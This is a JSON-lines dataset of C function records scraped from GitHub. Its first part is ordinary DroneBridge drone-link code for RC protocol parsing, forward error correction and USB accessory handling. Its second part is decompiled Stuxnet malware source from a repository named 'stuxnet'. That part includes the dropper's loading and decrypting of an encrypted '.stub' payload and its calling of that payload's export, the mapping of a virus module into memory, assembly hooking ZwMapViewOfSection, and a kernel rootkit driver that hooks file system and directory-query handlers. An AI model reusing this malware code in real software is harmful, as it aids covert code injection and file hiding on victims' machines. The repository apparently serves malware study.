{"docstring": "/**\n * Sets the desired RC protocol that is outputted to serial port\n * @param new_serial_protocol 1:MSPv1, 2:MSPv2, 3:MAVLink v1, 4 or 5:MAVLink v2\n * @param use_sumd Use SUMD if set to 'Y'\n * @return\n */\n", "func_signal": "void conf_rc_serial_protocol_air(int new_serial_protocol, char use_sumd)", "code": "{\n    if (use_sumd == 'Y')\n        serial_rc_protocol = RC_SERIAL_PROT_SUMD;\n    else if (new_serial_protocol == 4 || new_serial_protocol == 5)\n        serial_rc_protocol = RC_SERIAL_PROT_MAVLINKV2;\n    else\n        serial_rc_protocol = new_serial_protocol;\n}", "path": "DroneBridge/control/rc_air.c", "commit_date": "2019-08-20 00:00:00", "repo_name": "DroneBridge/DroneBridge", "stars": 673, "license": "apache-2.0", "language": "c", "size": 9063}
{"docstring": "/**\n * Resolves reduced system. Constructs \"mini\" encoding matrix, inverts\n * it, and multiply reduced vector by it.\n */\n", "func_signal": "static inline void resolve(int blockSize,\n                           unsigned char **data_blocks,\n                           unsigned char **fec_blocks,\n                           unsigned int *fec_block_nos,\n                           unsigned int *erased_blocks,\n                           unsigned short nr_fec_blocks)", "code": "{\n#ifdef PROFILE\n    long long begin;\n#endif\n    /* construct matrix */\n    int row;\n    unsigned char matrix[nr_fec_blocks * nr_fec_blocks];\n    int ptr;\n    int r;\n\n    /* we pick the submatrix of code that keeps colums corresponding to\n     * the erased data blocks, and rows corresponding to the present FEC\n     * blocks. This is the matrix by which we would need to multiply the\n     * missing data blocks to obtain the FEC blocks we have */\n    for (row = 0, ptr = 0; row < nr_fec_blocks; row++) {\n        int col;\n        unsigned int irow = 128 + fec_block_nos[row];\n        /*assert(irow < fec_blocks+128);*/\n        for (col = 0; col < nr_fec_blocks; col++, ptr++) {\n            unsigned int icol = erased_blocks[col];\n            matrix[ptr] = inverse[irow ^ icol];\n        }\n    }\n\n#ifdef PROFILE\n    begin = rdtsc();\n#endif\n    r = invert_mat(matrix, nr_fec_blocks);\n#ifdef PROFILE\n    invTime += rdtsc()-begin;\n#endif\n\n    if (r) {\n        int col;\n        fprintf(stderr, \"Pivot not found\\n\");\n        fprintf(stderr, \"Rows: \");\n        for (row = 0; row < nr_fec_blocks; row++)\n            fprintf(stderr, \"%d \", 128 + fec_block_nos[row]);\n        fprintf(stderr, \"\\n\");\n        fprintf(stderr, \"Columns: \");\n        for (col = 0; col < nr_fec_blocks; col++, ptr++)\n            fprintf(stderr, \"%d \", erased_blocks[col]);\n        fprintf(stderr, \"\\n\");\n        assert(0);\n    }\n\n    /* do the multiplication with the reduced code vector */\n    for (row = 0, ptr = 0; row < nr_fec_blocks; row++) {\n        int col;\n        unsigned char *target = data_blocks[erased_blocks[row]];\n        gf256_mul_mem(target, fec_blocks[0], matrix[ptr++], blockSize);\n        for (col = 1; col < nr_fec_blocks; col++, ptr++) {\n            gf256_muladd_mem(target, matrix[ptr], fec_blocks[col], blockSize);\n        }\n    }\n}", "path": "DroneBridge/video/fec.c", "commit_date": "2020-09-06 00:00:00", "repo_name": "DroneBridge/DroneBridge", "stars": 673, "license": "apache-2.0", "language": "c", "size": 9063}
{"docstring": "/**\n * Look for the OpenTX controller on the given interface. Reinitialize if it was unplugged.\n *\n * @param joy_interface_indx Number of the joystick interface\n * @param calibrate_comm The command to be executed to calibrate the OpenTX controller\n * @return The file descriptor\n */\n", "func_signal": "int initialize_opentx(int joy_interface_indx)", "code": "{\n    int fd;\n    char path_interface_joystick[500];  // eg. /dev/input/js0 with 0 as the interface index\n    get_joy_interface_path(path_interface_joystick, joy_interface_indx);\n    LOG_SYS_STD(LOG_INFO, \"DB_CONTROL_GND: Waiting for OpenTX RC to be detected on: %s\\n\", path_interface_joystick);\n    do {\n        usleep(100000);\n        fd = open(path_interface_joystick, O_RDONLY | O_NONBLOCK);\n    } while (fd < 0 && keep_running);\n    LOG_SYS_STD(LOG_INFO, \"DB_CONTROL_GND: Opened joystick interface!\\n\");\n    char calibrate_comm[CALI_COMM_SIZE];\n    strcpy(calibrate_comm, DEFAULT_OPENTX_CALIBRATION);\n    do_calibration(calibrate_comm, joy_interface_indx);\n    return fd;\n}", "path": "DroneBridge/control/opentx.c", "commit_date": "2019-09-12 00:00:00", "repo_name": "DroneBridge/DroneBridge", "stars": 673, "license": "apache-2.0", "language": "c", "size": 9063}
{"docstring": "/*\n * modnn(x) computes x % GF_SIZE, where GF_SIZE is 2**GF_BITS - 1,\n * without a slow divide.\n */\n", "func_signal": "static inline gf modnn(int x)", "code": "{\n    while (x >= GF_SIZE) {\n        x -= GF_SIZE;\n        x = (x >> GF_BITS) + (x & GF_SIZE);\n    }\n    return x;\n}", "path": "DroneBridge/video/fec.c", "commit_date": "2020-09-06 00:00:00", "repo_name": "DroneBridge/DroneBridge", "stars": 673, "license": "apache-2.0", "language": "c", "size": 9063}
{"docstring": "/**\n * Reads DroneBridge RC protocol and if crc is good we deserialize it and store the values (0-1000) inside rc_channels\n * @param db_rc_protocol_message A message formated as DroneBridge RC protocol\n * @return 1 if crc is valid and packet is good for further processing; -1 if packet has bad crc. Better skip it!\n * */\n", "func_signal": "int deserialize_db_rc_protocol(uint8_t *db_rc_protocol_message)", "code": "{\n    crc_db_rc = 0x00;\n    for (i_rc_air = 0; i_rc_air < 15; i_rc_air++) {\n        crc_db_rc = crc_table_db_rc[(crc_db_rc ^ db_rc_protocol_message[i_rc_air])] & 0xff;\n    }\n    if (crc_db_rc == db_rc_protocol_message[15]){\n        rc_channels[0] = db_rc_protocol_message[0] | ((db_rc_protocol_message[1] & 0x03) << 8);\n        rc_channels[1] = ((db_rc_protocol_message[1] & 0xFC) >> 2) | ((db_rc_protocol_message[2] & 0x0F) << 6);\n        rc_channels[2] = ((db_rc_protocol_message[2] & 0xF0) >> 4) | ((db_rc_protocol_message[3] & 0x3F) << 4);\n        rc_channels[3] = ((db_rc_protocol_message[3] & 0xC0) >> 6) | (db_rc_protocol_message[4] << 2);\n\n        rc_channels[4] = db_rc_protocol_message[5] | ((db_rc_protocol_message[6] & 0x03) << 8);\n        rc_channels[5] = ((db_rc_protocol_message[6] & 0xFC) >> 2) | ((db_rc_protocol_message[7] & 0x0F) << 6);\n        rc_channels[6] = ((db_rc_protocol_message[7] & 0xF0) >> 4) | ((db_rc_protocol_message[8] & 0x3F) << 4);\n        rc_channels[7] = ((db_rc_protocol_message[8] & 0xC0) >> 6) | (db_rc_protocol_message[9] << 2);\n\n        rc_channels[8] = db_rc_protocol_message[10] | ((db_rc_protocol_message[11] & 0x03) << 8);\n        rc_channels[9] = ((db_rc_protocol_message[11] & 0xFC) >> 2) | ((db_rc_protocol_message[12] & 0x0F) << 6);\n        rc_channels[10] = ((db_rc_protocol_message[12] & 0xF0) >> 4) | ((db_rc_protocol_message[13] & 0x3F) << 4);\n        rc_channels[11] = ((db_rc_protocol_message[13] & 0xC0) >> 6) | (db_rc_protocol_message[14] << 2);\n        return 1;\n    } else {\n        return -1; // packet is damaged\n    }\n}", "path": "DroneBridge/control/rc_air.c", "commit_date": "2019-08-20 00:00:00", "repo_name": "DroneBridge/DroneBridge", "stars": 673, "license": "apache-2.0", "language": "c", "size": 9063}
{"docstring": "/*\n * modnn(x) computes x % GF_SIZE, where GF_SIZE is 2**GF_BITS - 1,\n * without a slow divide.\n */\n", "func_signal": "static inline gf modnn(int x)", "code": "{\n    while (x >= GF_SIZE) {\n        x -= GF_SIZE;\n        x = (x >> GF_BITS) + (x & GF_SIZE);\n    }\n    return x;\n}", "path": "DroneBridge/video/fec_old.c", "commit_date": "2020-09-06 00:00:00", "repo_name": "DroneBridge/DroneBridge", "stars": 673, "license": "apache-2.0", "language": "c", "size": 9063}
{"docstring": "/**\n * Resolves reduced system. Constructs \"mini\" encoding matrix, inverts\n * it, and multiply reduced vector by it.\n */\n", "func_signal": "static inline void resolve(int blockSize,\n                           unsigned char **data_blocks,\n                           unsigned char **fec_blocks,\n                           unsigned int *fec_block_nos,\n                           unsigned int *erased_blocks,\n                           short nr_fec_blocks)", "code": "{\n#ifdef PROFILE\n    long long begin;\n#endif\n    /* construct matrix */\n    int row;\n    unsigned char matrix[nr_fec_blocks * nr_fec_blocks];\n    int ptr;\n    int r;\n\n    /* we pick the submatrix of code that keeps colums corresponding to\n     * the erased data blocks, and rows corresponding to the present FEC\n     * blocks. This is the matrix by which we would need to multiply the\n     * missing data blocks to obtain the FEC blocks we have */\n    for (row = 0, ptr = 0; row < nr_fec_blocks; row++) {\n        int col;\n        int irow = 128 + fec_block_nos[row];\n        /*assert(irow < fec_blocks+128);*/\n        for (col = 0; col < nr_fec_blocks; col++, ptr++) {\n            int icol = erased_blocks[col];\n            matrix[ptr] = inverse[irow ^ icol];\n        }\n    }\n\n#ifdef PROFILE\n    begin = rdtsc();\n#endif\n    r = invert_mat(matrix, nr_fec_blocks);\n#ifdef PROFILE\n    invTime += rdtsc()-begin;\n#endif\n\n    if (r) {\n        int col;\n        fprintf(stderr, \"Pivot not found\\n\");\n        fprintf(stderr, \"Rows: \");\n        for (row = 0; row < nr_fec_blocks; row++)\n            fprintf(stderr, \"%d \", 128 + fec_block_nos[row]);\n        fprintf(stderr, \"\\n\");\n        fprintf(stderr, \"Columns: \");\n        for (col = 0; col < nr_fec_blocks; col++, ptr++)\n            fprintf(stderr, \"%d \", erased_blocks[col]);\n        fprintf(stderr, \"\\n\");\n        assert(0);\n    }\n\n    /* do the multiplication with the reduced code vector */\n    for (row = 0, ptr = 0; row < nr_fec_blocks; row++) {\n        int col;\n        unsigned char *target = data_blocks[erased_blocks[row]];\n        mul(target, fec_blocks[0], matrix[ptr++], blockSize);\n        for (col = 1; col < nr_fec_blocks; col++, ptr++) {\n            addmul(target, fec_blocks[col], matrix[ptr], blockSize);\n        }\n    }\n}", "path": "DroneBridge/video/fec_old.c", "commit_date": "2020-09-06 00:00:00", "repo_name": "DroneBridge/DroneBridge", "stars": 673, "license": "apache-2.0", "language": "c", "size": 9063}
{"docstring": "/**\n * Closes AOA device and libusb backend. Reset buffer. Call at exit\n *\n * @param db_acc\n */\n", "func_signal": "void exit_close_aoa_device(db_accessory_t *db_acc)", "code": "{\n    memset(raw_usb_msg_buff, 0, DB_AOA_MAX_MSG_LENGTH);\n    if (db_acc->handle != NULL) {\n        int ret;\n        if ((ret = libusb_release_interface(db_acc->handle, 0)) != 0) {\n            if (ret == LIBUSB_ERROR_NO_DEVICE)\n                LOG_SYS_STD(LOG_WARNING, \"AOA_USB: Device disconnected. Could not release interface: %s\\n\",\n                            libusb_error_name(ret));\n            else\n                LOG_SYS_STD(LOG_ERR, \"AOA_USB: ERROR - releasing interface: %s\\n\", libusb_error_name(ret));\n        } else {\n            libusb_close(db_acc->handle);\n            LOG_SYS_STD(LOG_INFO, \"AOA_USB: Devices closed!\\n\");\n        }\n    }\n    libusb_exit(NULL);\n}", "path": "DroneBridge/usbbridge/linux_aoa.c", "commit_date": "2020-07-26 00:00:00", "repo_name": "DroneBridge/DroneBridge", "stars": 673, "license": "apache-2.0", "language": "c", "size": 9063}
{"docstring": "/**\n * Discover USB devices that support android accessory.\n *\n * @param db_acc\n * @return\n */\n", "func_signal": "int discover_compatible_devices(db_accessory_t *db_acc)", "code": "{\n    libusb_device **device_list;\n    libusb_device *found_device = NULL;\n    ssize_t cnt = libusb_get_device_list(NULL, &device_list);\n\n    LOG_SYS_STD(LOG_DEBUG, \"AOA_USB: Checking %zi USB devices\\n\", cnt);\n    for (ssize_t i = 0; i < cnt; i++) {\n        libusb_device *device = device_list[i];\n        if (supports_aoa(device, db_acc)) {\n            found_device = device;  // found a device that supports android accessory\n            break;\n        }\n    }\n    libusb_free_device_list(device_list, 1);\n\n    // open detected device to put it into accessory mode (next step. not in this function)\n    if (found_device) {\n        int ret = libusb_open(found_device, &db_acc->handle);\n        if (ret != 0 || db_acc->handle == NULL) {\n            LOG_SYS_STD(LOG_ERR, \"AOA_USB: ERROR - Unable to open detected device: %s\\n\", libusb_error_name(ret));\n            return -1;\n        }\n        return 1;\n    }\n    return 0;\n}", "path": "DroneBridge/usbbridge/linux_aoa.c", "commit_date": "2020-07-26 00:00:00", "repo_name": "DroneBridge/DroneBridge", "stars": 673, "license": "apache-2.0", "language": "c", "size": 9063}
{"docstring": "/* We do the matrix multiplication columns by column, instead of the\n * usual row-by-row, in order to capitalize on the cache freshness of\n * each data block . The data block only needs to be fetched once, and\n * can be used to be addmull'ed into all FEC blocks at once. No need\n * to worry about evicting FEC blocks from the cache: those are so\n * few (typically, 4 or 8) that they will fit easily in the cache (even\n * in the L2 cache...)\n */\n", "func_signal": "void fec_encode(int blockSize,\n                unsigned char **data_blocks,\n                unsigned int nrDataBlocks,\n                unsigned char **fec_blocks,\n                unsigned int nrFecBlocks)", "code": "{\n    unsigned int blockNo; /* loop for block counter */\n    unsigned int row, col;\n\n    assert(fec_initialized);\n    assert(nrDataBlocks <= 128);\n    assert(nrFecBlocks <= 128);\n\n    if (!nrDataBlocks)\n        return;\n\n    for (row = 0; row < nrFecBlocks; row++)\n        gf256_mul_mem(fec_blocks[row], data_blocks[0], inverse[128 ^ row], blockSize);\n\n    for (col = 129, blockNo = 1; blockNo < nrDataBlocks; col++, blockNo++) {\n        for (row = 0; row < nrFecBlocks; row++)\n            gf256_muladd_mem(fec_blocks[row], inverse[row ^ col], data_blocks[blockNo], blockSize);\n    }\n}", "path": "DroneBridge/video/fec.c", "commit_date": "2020-09-06 00:00:00", "repo_name": "DroneBridge/DroneBridge", "stars": 673, "license": "apache-2.0", "language": "c", "size": 9063}
{"docstring": "/**\n * Reduce the system by substracting all received data blocks from FEC blocks\n * This will allow to resolve the system by inverting a much smaller matrix\n * (with size being number of blocks lost, rather than number of data blocks\n * + fec)\n */\n", "func_signal": "static inline void reduce(unsigned int blockSize,\n                          unsigned char **data_blocks,\n                          unsigned int nr_data_blocks,\n                          unsigned char **fec_blocks,\n                          unsigned int *fec_block_nos,\n                          unsigned int *erased_blocks,\n                          unsigned short nr_fec_blocks)", "code": "{\n    int erasedIdx = 0;\n    unsigned int col;\n\n    /* First we reduce the code vector by substracting all known elements\n     * (non-erased data packets) */\n    for (col = 0; col < nr_data_blocks; col++) {\n        if (erasedIdx < nr_fec_blocks && erased_blocks[erasedIdx] == col) {\n            erasedIdx++;\n        } else {\n            unsigned char *src = data_blocks[col];\n            int j;\n            for (j = 0; j < nr_fec_blocks; j++) {\n                int blno = fec_block_nos[j];\n                addmul(fec_blocks[j], src, inverse[blno ^ col ^ 128], blockSize);\n            }\n        }\n    }\n\n    assert(nr_fec_blocks == erasedIdx);\n}", "path": "DroneBridge/video/fec_old.c", "commit_date": "2020-09-06 00:00:00", "repo_name": "DroneBridge/DroneBridge", "stars": 673, "license": "apache-2.0", "language": "c", "size": 9063}
{"docstring": "/*************************************************************************\n** This function check that the system is not too old or too new,       **\n** it works with all the versions of Windows from Windows 2000 to       **\n** Windows 8 included, in the asm code the function is called with a    **\n** value (0 and 1) but actually it is not used, maybe it was used in    **\n** the past.                                                            **\n*************************************************************************/\n", "func_signal": "void CheckSystemVersion(BOOL bUknownBool)", "code": "{\n\tstruct _OSVERSIONINFOW sVersionInformation; // [sp+0h] [bp-114h]@1\n\n\tsVersionInformation.dwOSVersionInfoSize = sizeof(struct _OSVERSIONINFOW);\n\t\n\tif(!GetVersionExW(&sVersionInformation)) return;\n\t\n\tif(sVersionInformation.dwPlatformId != VER_PLATFORM_WIN32_NT) return;\n  // Win2k -> Win8\n\tif(sVersionInformation.dwMajorVersion < 5 && sVersionInformation.dwMajorVersion > 6) return;\n\t\n\tLoadSTUBSection();\n}", "path": "stuxnet/Dropper/OS.c", "commit_date": "2016-09-20 00:00:00", "repo_name": "micrictor/stuxnet", "stars": 659, "license": "None", "language": "c", "size": 74}
{"docstring": "// Called from BLOCK4_InjectCodeIntoNTDLL\n// ECX = void *__ASM_BLOCK0_0\n", "func_signal": "void __declspec(naked) __ASM_BLOCK1_0(void)", "code": "{\n\t__asm\n\t{\n\t\tcall    __ASM_BLOCK1_1\n\t\tASM_ZwMapViewOfSection // \"ZwMapViewOfSection\", 0x00\n\t}\n}", "path": "stuxnet/Dropper/AssemblyBlock1.c", "commit_date": "2016-09-28 00:00:00", "repo_name": "micrictor/stuxnet", "stars": 659, "license": "None", "language": "c", "size": 74}
{"docstring": "// 98% (C) CODE MATCH\n", "func_signal": "INT32 Setup(LPCWSTR szDebugModuleName, PVOID pVirusModule, UINT32 iVirusModuleSize, HMODULE *hVirusModule)", "code": "{\n\tINT32 iResult; // [sp+0h] [bp-84h]@5\n\tGENERAL_INFO_BLOCK sInfoBlock; // [sp+4h] [bp-80h]@1\n\n\t// Get a random module name with the format \"KERNEL32.DLL.ASLR.XXXXXXXX\"\n\tif(GetRandomModuleName(&sInfoBlock, szDebugModuleName) != 0)\n\t\treturn 0;\n\n\t// Decrypt the Kernel32's and NTDLL's function names\n\tif(bSetup && DecodeEncryptedModuleNames() == FALSE)\n\t\treturn -12;\n\n\tiResult = LoadVirusModuleSection(GetCurrentProcess(), &sInfoBlock, pVirusModule, iVirusModuleSize, -1, NULL, 0, &s_virusBlocksPTR);\n\tif(iResult)\n\t\treturn iResult;\n\n\t// One-time\n\tif(bSetup)\n\t{\n\t\tiResult = LoadCodeSection(GetCurrentProcess(), s_virusBlocksPTR, &s_codeBlockPTR, &s_ASMCodeBlocksPTR);\n\t\tif(iResult) return iResult;\n\n\t\tbSetup = FALSE;\n\t}\n\n\tiResult = LoadAndInjectVirus((PASM_CODE_BLOCKS_HEADER)s_ASMCodeBlocksPTR, (PVIRUS_MODULE_BLOCKS_HEADER)s_virusBlocksPTR, &sInfoBlock);\n\tif(!iResult)\n\t\t*hVirusModule = ((PVIRUS_MODULE_BLOCKS_HEADER)s_virusBlocksPTR)->VirusModulePointer;\n\n\tg_hardAddrs.UnmapViewOfFile(s_virusBlocksPTR);\n\n\treturn iResult;\n}", "path": "stuxnet/Dropper/MemorySections.c", "commit_date": "2016-10-12 00:00:00", "repo_name": "micrictor/stuxnet", "stars": 659, "license": "None", "language": "c", "size": 74}
{"docstring": "// 95% (C) CODE MATCH\n", "func_signal": "INT32 LoadVirusModuleSection(HANDLE hHandle, PGENERAL_INFO_BLOCK sInfoBlock, PVOID pVirusModule, INT32 pVirusModuleSize, INT32 iExecEntryNumber, PVOID pUnknownSegment, UINT32 pUnknownSegmentSize, PVOID *pOutSection)", "code": "{\n\tHANDLE hMapHandle; // [sp+4h] [bp-28h]@1\n\tPVOID pVirusImageBase; // [sp+8h] [bp-24h]@3\n\tPIMAGE_NT_HEADERS pImageNT; // [sp+Ch] [bp-20h]@6\n\tPIMAGE_DOS_HEADER pImageDOS; // [sp+18h] [bp-14h]@3\n\tPVIRUS_MODULE_BLOCKS_HEADER sVirusModuleBlocksHeader; // [sp+24h] [bp-8h]@3\n\n\tPVOID pCurrAddr = 0;\n\tPVOID pBaseAddr = 0;\n\n\tINT32 iSectionPointer  = 0;\n\tUINT32 iSectionsSize   = sizeof(VIRUS_MODULE_BLOCKS_HEADER) + pUnknownSegmentSize + pVirusModuleSize;\n\n\tINT32 iOpenMapViewFailed = SharedMapViewOfSection(hHandle, iSectionsSize, &hMapHandle, &pCurrAddr, &pBaseAddr);\n\tif(iOpenMapViewFailed)\n\t\treturn iOpenMapViewFailed;\n\n\tsVirusModuleBlocksHeader = (PVIRUS_MODULE_BLOCKS_HEADER)pBaseAddr;\n\tpCurrAddr                = (PVOID)((DWORD)pCurrAddr + sizeof(VIRUS_MODULE_BLOCKS_HEADER));\n\n\t// Don't overwrite the header\n\tiSectionPointer          = sizeof(VIRUS_MODULE_BLOCKS_HEADER);\n\n\tCopySegmentIntoSections(&pCurrAddr, pBaseAddr, &iSectionPointer, &sVirusModuleBlocksHeader->UnknownSegment, pUnknownSegment, pUnknownSegmentSize);\n\tpVirusImageBase = pCurrAddr;\n\n\tCopySegmentIntoSections(&pCurrAddr, pBaseAddr, &iSectionPointer, &sVirusModuleBlocksHeader->VirusModuleSegment, pVirusModule, pVirusModuleSize);\n\tpImageDOS = (PIMAGE_DOS_HEADER)pVirusImageBase;\n\n\t// if virusmodule has \"MZ\" magic for .exe and virus is within size bounds\n\tif((UINT32)pVirusModuleSize >= 0x1000 &&\n\t   pImageDOS->e_magic == MZ_HEADER &&\n\t   pImageDOS->e_lfanew + sizeof(IMAGE_OPTIONAL_HEADER) + sizeof(IMAGE_FILE_HEADER) + sizeof(DWORD) < (UINT32)pVirusModuleSize) // (UINT32 *)pImageDOS[15] + 248 -> Section \".text\"\n\t{\n\t\tpImageNT = (PIMAGE_NT_HEADERS)((DWORD)pVirusImageBase + pImageDOS->e_lfanew);\n\n\t\t// According to the below references, each entry in the delay import table is 32 bits\n\t\t//  so what the actual fuck is going on here. I suppose delayed injection would be a good way\n\t\t//  of dodging an AV's runtime check, as the virus is loaded into memory as-needed.\n\t\t// Still wouldn't explain why we're subtracting 8 from the Size\n\t\t// https://msdn.microsoft.com/en-us/library/windows/desktop/ms680305(v=vs.85).aspx\n\t\t// http://svn.wildfiregames.com/docs/structImgDelayDescr.html\n\t\tif(pImageNT->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT].Size == 72)\n\t\t\tpImageNT->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT].Size = 64; // Change Delay Import Directory Size\n\t}\n\n\t__memcpy(&sVirusModuleBlocksHeader->InformationBlock, sInfoBlock, sizeof(GENERAL_INFO_BLOCK));\n\n\tsVirusModuleBlocksHeader->LibraryExecuteEntryNumber = iExecEntryNumber;\n\tsVirusModuleBlocksHeader->VirusModulePointer        = 0;\n\n\t*pOutSection = pBaseAddr;\n\n\tg_hardAddrs.UnmapViewOfFile(pBaseAddr); // Also unmaps sVirusModuleBlocks header\n\tg_hardAddrs.ZwClose(hMapHandle);\n\n\treturn 0;\n}", "path": "stuxnet/Dropper/MemorySections.c", "commit_date": "2016-10-12 00:00:00", "repo_name": "micrictor/stuxnet", "stars": 659, "license": "None", "language": "c", "size": 74}
{"docstring": "// 99% (C) CODE MATCH\n", "func_signal": "void LoadSTUBSection(void)", "code": "{\n\tFARPROC pVirusExecEntry; // eax@3\n\tINT32 pSectionVirtualSize; // [sp+0h] [bp-Ch]@1\n\tDWORD *pSectionSTUB; // [sp+4h] [bp-8h]@1\n\tHMODULE hVirusModule; // [sp+8h] [bp-4h]@2\n\n\t/* --->> Get the \".stub\" section's RVA and Virtual Sizee <<--- */\n\tif(!LocateSTUBSection((PVOID *)&pSectionSTUB, &pSectionVirtualSize)) return;\n\n\tDecryptSTUBSection((char *)(pSectionSTUB[0] + (UINT32)pSectionSTUB), pSectionSTUB[1]);// (552, 498176)\n\n\tif(!Setup(NULL, (PVOID)(*pSectionSTUB + (UINT32)pSectionSTUB), pSectionSTUB[1], &hVirusModule)) // (0, 552, 498176, ...)\n\t{\n\t\t// Run the 15th exported function from the loaded module\n\t\tpVirusExecEntry = GetProcAddress(hVirusModule, (LPCSTR)15);\n\t\tif(pVirusExecEntry)\n\t\t\t((__tLibraryExecEntry)pVirusExecEntry)((DWORD)pSectionSTUB, pSectionVirtualSize);\n\n\t\tFreeLibrary(hVirusModule);\n\t}\n}", "path": "stuxnet/Dropper/STUBHandler.c", "commit_date": "2016-09-20 00:00:00", "repo_name": "micrictor/stuxnet", "stars": 659, "license": "None", "language": "c", "size": 74}
{"docstring": "// Jump to address at top of stack\n", "func_signal": "void __declspec(naked) __ASM_BLOCK0_2(void)", "code": "{\n\t__asm\n\t{\n\t\tpop     edx\n\t\tjmp     dword ptr [edx]\n\t}\n}", "path": "stuxnet/Dropper/AssemblyBlock0.c", "commit_date": "2016-10-12 00:00:00", "repo_name": "micrictor/stuxnet", "stars": 659, "license": "None", "language": "c", "size": 74}
{"docstring": "/**-------------------------------------------------------------------\n\n    Driver Entry\n\n----------------------------------------------------------------------**/\n", "func_signal": "NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObject, IN PUNICODE_STRING theRegistryPath )", "code": "{\n    int i;\n    NTSTATUS status;\n    DriverObject=pDriverObject;\n    status=IoCreateDevice(DriverObject, sizeof(_DEVICE_EXTENSION),0,FILE_DEVICE_DISK_FILE_SYSTEM,0x100,0,&DeviceObject);\n    if (status!=STATUS_SUCCESS){\n        IoDeleteDevice(DeviceObject);\n        return 0;   \n    }\n    SetZero(DeviceObject->DeviceExtension,0);\n    for(i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++ )\n    {\n       DriverObject->MajorFunction[i] = IRPDispatchRoutine;\n    }\n    DriverObject->MajorFunction[IRP_MJ_FILE_SYSTEM_CONTROL] = OnFileSystemControl;\n    DriverObject->MajorFunction[IRP_MJ_DIRECTORY_CONTROL] =  OnDirectoryControl;\n    SetFastIoDispatch();\n    HookingFileSystems();\n    status = IoRegisterFsRegistrationChange( DriverObject, (PDRIVER_FS_NOTIFICATION)DriverNotificationRoutine);\n    if (status!=STATUS_SUCCESS){    \n        IoDeleteDevice(DeviceObject);\n        DriverObject->FastIoDispatch = 0;\n        return status; //Error\n    }\n    return STATUS_SUCCESS;\n}", "path": "stuxnet/Rootkit/main.c", "commit_date": "2016-09-20 00:00:00", "repo_name": "micrictor/stuxnet", "stars": 659, "license": "None", "language": "c", "size": 74}
{"docstring": "// 85% (C) CODE MATCH -> NEED DEBUG\n", "func_signal": "bool LocateSTUBSection(PVOID *pRawSectionSTUB, INT32 *pSectionVirtualSize)", "code": "{\n\tPIMAGE_NT_HEADERS pImageNT; // esi@3\n\tPIMAGE_SECTION_HEADER pImageSection; // edi@5\n\tUINT32 *pSectionSTUB; // eax@11\n\n\tif(((PIMAGE_DOS_HEADER)g_hInstDLL)->e_magic != MZ_HEADER)\n\t\treturn FALSE;\n\n\tpImageNT = (PIMAGE_NT_HEADERS)((DWORD)g_hInstDLL + ((PIMAGE_DOS_HEADER)hINSTANCE)->e_lfanew); // (hINSTANCE + 240)\n\n\tif(pImageNT->Signature != PE_HEADER)\n\t\treturn FALSE;\n\n\tpImageSection = (PIMAGE_SECTION_HEADER)(pImageNT->FileHeader.SizeOfOptionalHeader + (DWORD)pImageNT + sizeof(IMAGE_FILE_HEADER) + sizeof(DWORD)); // (PE header + 224 + 24)\n\n\tif(pImageNT->FileHeader.NumberOfSections <= 0)\n\t\treturn FALSE;\n\n\tint i = 0;\n\t// Strcmp remains true when strs don't match\n\twhile(lstrcmpiA((LPCSTR)pImageSection->Name, \".stub\"))\n\t{\n\t\ti++;\n\t\tif(i >= pImageNT->FileHeader.NumberOfSections)\n\t\t\treturn false;\n\n\t\tpImageSection++; // Next section\n\t}\n\n\tif(pImageSection->SizeOfRawData < STUB_HEADER_LEN)\n\t\treturn FALSE;\n\n\tpSectionSTUB = (UINT32 *)((UINT32)g_hInstDLL + pImageSection->VirtualAddress);\n\tif(*pSectionSTUB != STUB_INTEGRITY_MARK)\n\t\treturn FALSE;\n\n\t/*\n\t* Remove the headers\n\t* pSectionSTUB++ because it's an array of 4-byte values\n\t*/\n\t*pRawSectionSTUB     = pSectionSTUB++;\n\t*pSectionVirtualSize = pImageSection->SizeOfRawData - 0x4; // Size - header\n\n\treturn TRUE;\n}", "path": "stuxnet/Dropper/STUBHandler.c", "commit_date": "2016-09-20 00:00:00", "repo_name": "micrictor/stuxnet", "stars": 659, "license": "None", "language": "c", "size": 74}
{"docstring": "// This replaces the builtin MSDOS stub that usually checks for compatability\n// ( the infamous \"This program cannot be run in DOS mode\")\n", "func_signal": "void __declspec(naked) __ASM_BLOCK0_0(void)", "code": "{\n\t__asm\n\t{\n\t\tcmp     edx, [eax]\n\t\tdec     ecx\n\t\tstosd\n\n\t\tmov     dl, 0\n\t\tjmp     short __ASM_REF_0\n\n\t\tmov     dl, 1\n\t\tjmp     short __ASM_REF_0\n\n\t\tmov     dl, 2\n\t\tjmp     short __ASM_REF_0\n\n\t\tmov     dl, 3\n\t\tjmp     short __ASM_REF_0\n\n\t\tmov     dl, 4\n\t\tjmp     short __ASM_REF_0\n\n\t\tmov     dl, 5\n\t\tjmp     short $+2\n\n\t__ASM_REF_0:\n\t\tpush    edx\n\t\tcall    __ASM_BLOCK0_2\n\t}\n}", "path": "stuxnet/Dropper/AssemblyBlock0.c", "commit_date": "2016-10-12 00:00:00", "repo_name": "micrictor/stuxnet", "stars": 659, "license": "None", "language": "c", "size": 74}
{"docstring": "/**-------------------------------------------------------------------\n\n    File System Control\n\n----------------------------------------------------------------------**/\n", "func_signal": "VOID OnFileSystemControl(PDEVICE_OBJECT DeviceObject,PIRP Irp)", "code": "{\n  if (Irp->Tail.Overlay.CurrentStackLocation->MinorFunction == IRP_MN_MOUNT_VOLUME){\n      SetCompletionFileControl(DeviceObject,Irp);\n  }else{\n    return CallDriver(DeviceObject,Irp);\n  }\n}", "path": "stuxnet/Rootkit/main.c", "commit_date": "2016-09-20 00:00:00", "repo_name": "micrictor/stuxnet", "stars": 659, "license": "None", "language": "c", "size": 74}
{"docstring": "/**-------------------------------------------------------------------\n\n    Directory Control\n\n----------------------------------------------------------------------**/\n", "func_signal": "VOID OnDirectoryControl(PDEVICE_OBJECT DeviceObject,PIRP Irp)", "code": "{\n  if (Irp->Tail.Overlay.CurrentStackLocation->MinorFunction == IRP_MN_QUERY_DIRECTORY){\n      SetCompletionDirControl(DeviceObject,Irp);\n  }else{\n    return CallDriver(DeviceObject,Irp);\n  }\n}", "path": "stuxnet/Rootkit/main.c", "commit_date": "2016-09-20 00:00:00", "repo_name": "micrictor/stuxnet", "stars": 659, "license": "None", "language": "c", "size": 74}
